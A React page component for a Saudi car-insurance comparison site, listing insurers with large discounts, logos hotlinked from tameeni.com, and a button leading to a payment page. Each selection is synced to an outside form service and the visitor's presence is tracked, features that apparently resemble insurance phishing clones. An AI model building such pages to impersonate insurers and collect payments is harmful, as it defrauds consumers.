import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Shield, Car, CheckCircle2, Star, ArrowLeft, Percent } from "lucide-react";
import { Header } from "@/components/Header";
import { ChatButton } from "@/components/ChatButton";
import { Footer } from "@/components/Footer";
import { useFormspreeSync } from "@/hooks/useFormspreeSync";
import { useAutoSave } from "@/hooks/useAutoSave";
import { useApplicationData } from "@/hooks/useApplicationData";
import { usePresence } from "@/hooks/usePresence";

interface InsuranceCompany {
  id: number;
  name: string;
  shortName: string;
  regularPrice: number;
  salePrice: number;
  logo: string;
  discount: number;
  features: string[];
  rating: number;
  isPopular?: boolean;
}

// شركات التأمين السعودية - ضد الغير
const thirdPartyCompanies: InsuranceCompany[] = [
  {
    id: 1,
    name: "شركة ملاذ للتأمين",
    shortName: "ملاذ",
    regularPrice: 850,
    salePrice: 510,
    logo: "https://www.tameeni.com/images/ic-logos/full/3.png",
    discount: 40,
    features: ["تغطية شاملة ضد الغير", "خدمة عملاء 24/7", "إصدار فوري"],
    rating: 4.5,
    isPopular: true
  },
  {
    id: 2,
    name: "شركة ولاء للتأمين",
    shortName: "ولاء",
    regularPrice: 720,
    salePrice: 504,
    logo: "https://www.tameeni.com/images/ic-logos/full/5.png",
    discount: 30,
    features: ["تغطية الحوادث", "مساعدة على الطريق", "إصدار فوري"],
    rating: 4.3
  },
  {
    id: 3,
    name: "شركة أمانة للتأمين",
    shortName: "أمانة",
    regularPrice: 680,
    salePrice: 578,
    logo: "https://www.tameeni.com/images/ic-logos/full/4.png",
    discount: 15,
    features: ["تغطية أساسية", "أسعار تنافسية", "إصدار سريع"],
    rating: 4.0
  },
  {
    id: 4,
    name: "الشركة العربية للتأمين التعاوني (سلامة)",
    shortName: "سلامة",
    regularPrice: 920,
    salePrice: 644,
    logo: "https://www.tameeni.com/images/ic-logos/full/9.png",
    discount: 30,
    features: ["تغطية موسعة", "خصم عدم المطالبات", "خدمة مميزة"],
    rating: 4.4
  },
  {
    id: 5,
    name: "شركة الدرع العربي للتأمين",
    shortName: "الدرع العربي",
    regularPrice: 780,
    salePrice: 702,
    logo: "https://www.tameeni.com/images/ic-logos/full/6.png",
    discount: 10,
    features: ["تغطية أساسية", "إصدار سريع", "دعم فني"],
    rating: 4.1
  },
  {
    id: 6,
    name: "شركة التعاونية للتأمين",
    shortName: "التعاونية",
    regularPrice: 950,
    salePrice: 665,
    logo: "https://www.tameeni.com/images/ic-logos/full/7.png",
    discount: 30,
    features: ["تغطية شاملة", "شبكة ورش واسعة", "خدمة عملاء متميزة"],
    rating: 4.6,
    isPopular: true
  },
  {
    id: 7,
    name: "شركة الاتحاد للتأمين التعاوني",
    shortName: "الاتحاد",
    regularPrice: 690,
    salePrice: 621,
    logo: "https://www.tameeni.com/images/ic-logos/full/12.png",
    discount: 10,
    features: ["تغطية أساسية", "أسعار مناسبة", "إصدار فوري"],
    rating: 4.0
  },
  {
    id: 8,
    name: "شركة المتكاملة للتأمين",
    shortName: "المتكاملة",
    regularPrice: 820,
    salePrice: 574,
    logo: "https://www.tameeni.com/images/ic-logos/full/10.png",
    discount: 30,
    features: ["تغطية متكاملة", "خدمة سريعة", "أسعار تنافسية"],
    rating: 4.2
  }
];

// شركات التأمين السعودية - شامل
const comprehensiveCompanies: InsuranceCompany[] = [
  {
    id: 11,
    name: "شركة تكافل الراجحي",
    shortName: "الراجحي",
    regularPrice: 3200,
    salePrice: 1920,
    logo: "https://www.tameeni.com/images/ic-logos/full/14.png",
    discount: 40,
    features: ["تغطية شاملة كاملة", "قطع غيار أصلية", "سيارة بديلة", "خدمة VIP"],
    rating: 4.8,
    isPopular: true
  },
  {
    id: 12,
    name: "الشركة الخليجية العامة للتأمين",
    shortName: "الخليجية",
    regularPrice: 2800,
    salePrice: 1960,
    logo: "https://www.tameeni.com/images/ic-logos/full/11.png",
    discount: 30,
    features: ["تغطية شاملة", "شبكة ورش معتمدة", "خدمة عملاء 24/7"],
    rating: 4.5
  },
  {
    id: 13,
    name: "شركة بروج للتأمين التعاوني",
    shortName: "بروج",
    regularPrice: 2650,
    salePrice: 2120,
    logo: "https://www.tameeni.com/images/ic-logos/full/2.png",
    discount: 20,
    features: ["تغطية شاملة", "إصلاح سريع", "خصم عدم المطالبات"],
    rating: 4.3
  },
  {
    id: 14,
    name: "شركة التعاونية للتأمين",
    shortName: "التعاونية",
    regularPrice: 3500,
    salePrice: 2275,
    logo: "https://www.tameeni.com/images/ic-logos/full/7.png",
    discount: 35,
    features: ["تغطية بلاتينية", "قطع غيار وكالة", "سيارة بديلة فورية", "تأمين على السائق"],
    rating: 4.7,
    isPopular: true
  },
  {
    id: 15,
    name: "شركة ملاذ للتأمين",
    shortName: "ملاذ",
    regularPrice: 2400,
    salePrice: 1920,
    logo: "https://www.tameeni.com/images/ic-logos/full/3.png",
    discount: 20,
    features: ["تغطية شاملة", "خدمة مساعدة على الطريق", "إصدار فوري"],
    rating: 4.4
  },
  {
    id: 16,
    name: "شركة ولاء للتأمين",
    shortName: "ولاء",
    regularPrice: 2200,
    salePrice: 1870,
    logo: "https://www.tameeni.com/images/ic-logos/full/5.png",
    discount: 15,
    features: ["تغطية شاملة أساسية", "أسعار تنافسية", "خدمة عملاء متاحة"],
    rating: 4.2
  },
  {
    id: 17,
    name: "شركة الدرع العربي للتأمين",
    shortName: "الدرع العربي",
    regularPrice: 2100,
    salePrice: 1995,
    logo: "https://www.tameeni.com/images/ic-logos/full/6.png",
    discount: 5,
    features: ["تغطية أساسية", "شبكة ورش محلية", "إصدار سريع"],
    rating: 4.0
  },
  {
    id: 18,
    name: "شركة العربية للتأمين التعاوني (سلامة)",
    shortName: "سلامة",
    regularPrice: 2900,
    salePrice: 2030,
    logo: "https://www.tameeni.com/images/ic-logos/full/9.png",
    discount: 30,
    features: ["تغطية شاملة موسعة", "قطع غيار معتمدة", "خدمة متميزة"],
    rating: 4.5
  },
  {
    id: 19,
    name: "شركة المتكاملة للتأمين",
    shortName: "المتكاملة",
    regularPrice: 2350,
    salePrice: 1998,
    logo: "https://www.tameeni.com/images/ic-logos/full/10.png",
    discount: 15,
    features: ["تغطية متكاملة", "خدمة سريعة", "أسعار معقولة"],
    rating: 4.1
  },
  {
    id: 20,
    name: "شركة الاتحاد للتأمين التعاوني",
    shortName: "الاتحاد",
    regularPrice: 2000,
    salePrice: 1800,
    logo: "https://www.tameeni.com/images/ic-logos/full/12.png",
    discount: 10,
    features: ["تغطية أساسية", "أسعار مناسبة", "خدمة جيدة"],
    rating: 4.0
  }
];

const InsuranceSelection = () => {
  const navigate = useNavigate();
  const [insuranceType, setInsuranceType] = useState<"comprehensive" | "third-party">("third-party");
  const [selectedCompany, setSelectedCompany] = useState<string>("");
  const [sortBy, setSortBy] = useState<"price" | "discount" | "rating">("discount");
  const { applicationId, createOrUpdateApplication } = useApplicationData();
  usePresence(applicationId || undefined);

  useEffect(() => {
    console.log('Insurance selection page mounted with applicationId:', applicationId);
  }, [applicationId]);

  useFormspreeSync({
    insuranceType,
    selectedCompany
  }, "صفحة اختيار التأمين - Insurance Selection");

  useAutoSave(applicationId, {
    selected_company: selectedCompany,
    current_step: 'insurance_selection'
  }, "InsuranceSelection");

  const displayedCompanies = insuranceType === "comprehensive" ? comprehensiveCompanies : thirdPartyCompanies;

  const sortedCompanies = [...displayedCompanies].sort((a, b) => {
    if (sortBy === "price") return a.salePrice - b.salePrice;
    if (sortBy === "discount") return b.discount - a.discount;
    if (sortBy === "rating") return b.rating - a.rating;
    return 0;
  });

  const handleSelectCompany = async (company: InsuranceCompany) => {
    setSelectedCompany(`${company.name} - السعر: ${company.salePrice}﷼`);
    
    try {
      await createOrUpdateApplication({
        selected_company: company.name,
        selected_price: company.salePrice.toString(),
        regular_price: company.regularPrice.toString(),
        company_logo: company.logo,
        current_step: 'insurance_selection'
      });
      
      navigate(`/payment?company=${encodeURIComponent(company.name)}&price=${company.salePrice}&regularPrice=${company.regularPrice}`);
    } catch (error) {
      console.error('Error saving selection:', error);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-sky-50 to-background">
      <Header />
      
      <section className="py-8 px-4 md:px-6">
        <div className="container mx-auto max-w-7xl">
          {/* Page Header */}
          <div className="text-center mb-8">
            <h1 className="text-3xl md:text-4xl font-bold text-foreground mb-3">
              اختر التأمين المناسب لك
            </h1>
            <p className="text-muted-foreground text-lg">
              قارن بين أفضل عروض شركات التأمين في المملكة
            </p>
          </div>

          {/* Insurance Type Tabs */}
          <div className="flex justify-center mb-8">
            <div className="bg-muted p-1.5 rounded-2xl inline-flex gap-2">
              <button
                onClick={() => setInsuranceType("third-party")}
                className={`flex items-center gap-2 px-6 py-3 rounded-xl text-sm md:text-base font-medium transition-all ${
                  insuranceType === "third-party"
                    ? "bg-primary text-primary-foreground shadow-lg"
                    : "text-muted-foreground hover:text-foreground"
                }`}
              >
                <Shield className="h-5 w-5" />
                <span>تأمين ضد الغير</span>
              </button>
              <button
                onClick={() => setInsuranceType("comprehensive")}
                className={`flex items-center gap-2 px-6 py-3 rounded-xl text-sm md:text-base font-medium transition-all ${
                  insuranceType === "comprehensive"
                    ? "bg-primary text-primary-foreground shadow-lg"
                    : "text-muted-foreground hover:text-foreground"
                }`}
              >
                <Car className="h-5 w-5" />
                <span>تأمين شامل</span>
              </button>
            </div>
          </div>

          {/* Sort Options */}
          <div className="flex justify-center gap-3 mb-8 flex-wrap">
            <span className="text-muted-foreground self-center">ترتيب حسب:</span>
            {[
              { key: "discount", label: "أعلى خصم" },
              { key: "price", label: "أقل سعر" },
              { key: "rating", label: "أعلى تقييم" }
            ].map((option) => (
              <Button
                key={option.key}
                variant={sortBy === option.key ? "default" : "outline"}
                size="sm"
                onClick={() => setSortBy(option.key as "price" | "discount" | "rating")}
                className="rounded-full"
              >
                {option.label}
              </Button>
            ))}
          </div>

          {/* Results Count */}
          <div className="text-center mb-6">
            <p className="text-muted-foreground">
              عرض <span className="font-bold text-foreground">{sortedCompanies.length}</span> شركة تأمين
            </p>
          </div>

          {/* Insurance Cards Grid */}
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-6 mb-12">
            {sortedCompanies.map((company, index) => (
              <Card 
                key={company.id} 
                className={`relative overflow-hidden transition-all duration-300 hover:shadow-xl hover:-translate-y-1 border-2 ${
                  company.isPopular ? 'border-primary/50' : 'border-transparent'
                }`}
              >
                {/* Discount Badge */}
                <div className="absolute top-3 right-3 z-10">
                  <Badge 
                    className={`text-sm font-bold px-3 py-1 ${
                      company.discount >= 30 
                        ? 'bg-red-500 hover:bg-red-600' 
                        : company.discount >= 20 
                        ? 'bg-orange-500 hover:bg-orange-600'
                        : 'bg-primary hover:bg-primary/90'
                    }`}
                  >
                    <Percent className="h-3 w-3 ml-1" />
                    خصم {company.discount}%
                  </Badge>
                </div>

                {/* Popular Badge */}
                {company.isPopular && (
                  <div className="absolute top-3 left-3 z-10">
                    <Badge variant="outline" className="bg-background border-primary text-primary">
                      <Star className="h-3 w-3 ml-1 fill-primary" />
                      الأكثر طلباً
                    </Badge>
                  </div>
                )}

                <div className="p-5">
                  {/* Company Logo */}
                  <div className="bg-white rounded-xl p-4 mb-4 h-24 flex items-center justify-center border border-border">
                    <img 
                      src={company.logo} 
                      alt={company.name} 
                      className="max-h-16 max-w-full object-contain"
                      onError={(e) => {
                        (e.target as HTMLImageElement).src = 'https://via.placeholder.com/150x80?text=' + encodeURIComponent(company.shortName);
                      }}
                    />
                  </div>

                  {/* Company Name */}
                  <h3 className="font-bold text-foreground text-center mb-2 text-sm leading-tight min-h-[40px]">
                    {company.name}
                  </h3>

                  {/* Rating */}
                  <div className="flex items-center justify-center gap-1 mb-4">
                    <Star className="h-4 w-4 fill-yellow-400 text-yellow-400" />
                    <span className="text-sm font-medium">{company.rating}</span>
                    <span className="text-xs text-muted-foreground">/5</span>
                  </div>

                  {/* Price Section */}
                  <div className="bg-muted/50 rounded-xl p-4 mb-4">
                    <div className="flex items-center justify-center gap-2 mb-1">
                      <span className="text-sm text-muted-foreground line-through">
                        {company.regularPrice.toLocaleString()} ر.س
                      </span>
                    </div>
                    <div className="text-center">
                      <span className="text-2xl font-bold text-primary">
                        {company.salePrice.toLocaleString()}
                      </span>
                      <span className="text-sm text-primary mr-1">ر.س</span>
                    </div>
                    <p className="text-xs text-muted-foreground text-center mt-1">
                      شامل الضريبة
                    </p>
                  </div>

                  {/* Features */}
                  <div className="space-y-2 mb-4">
                    {company.features.slice(0, 3).map((feature, idx) => (
                      <div key={idx} className="flex items-center gap-2 text-xs text-muted-foreground">
                        <CheckCircle2 className="h-3.5 w-3.5 text-green-500 flex-shrink-0" />
                        <span>{feature}</span>
                      </div>
                    ))}
                  </div>

                  {/* CTA Button */}
                  <Button 
                    className="w-full bg-primary hover:bg-primary/90 text-primary-foreground rounded-xl py-5 font-bold"
                    onClick={() => handleSelectCompany(company)}
                  >
                    اشتري الآن
                    <ArrowLeft className="h-4 w-4 mr-2" />
                  </Button>
                </div>
              </Card>
            ))}
          </div>

          {/* Navigation */}
          <div className="flex justify-center">
            <Button 
              variant="outline" 
              size="lg" 
              onClick={() => navigate("/vehicle-info")}
              className="px-8 rounded-xl"
            >
              العودة للخلف
            </Button>
          </div>
        </div>
      </section>

      <ChatButton />
      <Footer />
    </div>
  );
};

export default InsuranceSelection;
